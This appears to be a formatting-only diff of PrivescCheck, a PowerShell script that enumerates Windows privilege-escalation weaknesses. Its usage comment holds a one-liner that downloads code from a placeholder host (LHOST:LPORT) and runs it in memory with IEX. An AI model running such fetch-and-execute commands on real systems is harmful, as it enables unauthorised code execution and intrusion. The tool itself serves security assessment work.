@@ -43,7 +43,8 @@ function Invoke-PrivescCheck {
     C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
     #>
 
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [switch] $Extended = $false,
         [switch] $Audit = $false,
         [switch] $Experimental = $false,
@@ -194,7 +195,7 @@ function ConvertFrom-Gzip {
 }
 
 function ConvertFrom-EmbeddedTextBlob {
-    param ([String] $TextBlob)
+    param([String] $TextBlob)
     $Decoded = [System.Convert]::FromBase64String($TextBlob)
     ConvertFrom-Gzip -Bytes $Decoded
 }
@@ -202,7 +203,7 @@ function ConvertFrom-EmbeddedTextBlob {
 function Invoke-DynamicCommand {
 
     [CmdletBinding()]
-    param (
+    param(
         [string] $Command
     )
 
@@ -214,7 +215,8 @@ function Invoke-DynamicCommand {
 
 function Invoke-Check {
 
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object] $Check
     )
 
@@ -245,13 +247,14 @@ function Invoke-Check {
 function Write-CheckBanner {
 
     [OutputType([string])]
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object] $Check,
         [switch] $Ascii
     )
 
     function Split-Description {
-        param([string]$Description)
+        param([string] $Description)
 
         $DescriptionSplit = New-Object System.Collections.ArrayList
         $TempOld = ""
@@ -260,7 +263,7 @@ function Write-CheckBanner {
 
             $TempNew = "$($TempOld) $($_)".Trim()
             if ($TempNew.Length -gt 60) {
-                [void]$DescriptionSplit.Add($TempOld)
+                [void] $DescriptionSplit.Add($TempOld)
                 $TempOld = "$($_)"
             }
             else {
@@ -268,7 +271,7 @@ function Write-CheckBanner {
             }
         }
         if ($TempOld) {
-            [void]$DescriptionSplit.Add($TempOld)
+            [void] $DescriptionSplit.Add($TempOld)
         }
         $DescriptionSplit
     }
@@ -290,7 +293,7 @@ function Write-CheckBanner {
     $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
     $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
     Split-Description -Description $Check.Description | ForEach-Object {
-        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String]$_).Length)) $($HeavyVertical)`n"
+        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String] $_).Length)) $($HeavyVertical)`n"
     }
     $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
     $Result
@@ -299,7 +302,8 @@ function Write-CheckBanner {
 function Write-CheckResult {
 
     [OutputType([string])]
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object] $CheckResult
     )
 
@@ -335,7 +339,8 @@ function Write-CheckResult {
 
 function Write-TxtReport {
 
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object[]] $AllResults
     )
 
@@ -347,7 +352,8 @@ function Write-TxtReport {
 
 function Write-CsvReport {
 
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object[]] $AllResults
     )
 
@@ -364,7 +370,8 @@ function Write-XmlReport {
     https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
     #>
 
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object[]] $AllResults
     )
 
@@ -378,7 +385,8 @@ function Write-XmlReport {
 function Write-HtmlReport {
 
     [OutputType([string])]
-    [CmdletBinding()] param(
+    [CmdletBinding()]
+    param(
         [object[]] $AllResults
     )
 
@@ -510,7 +518,8 @@ function Get-SeverityColor {
 
 function Write-ShortReport {
 
-    [CmdletBinding()] param()
+    [CmdletBinding()]
+    param()
 
     $HeavyVertical = [char] 0x2503
     # $HeavyVerticalAndRight = [char] 0x2523
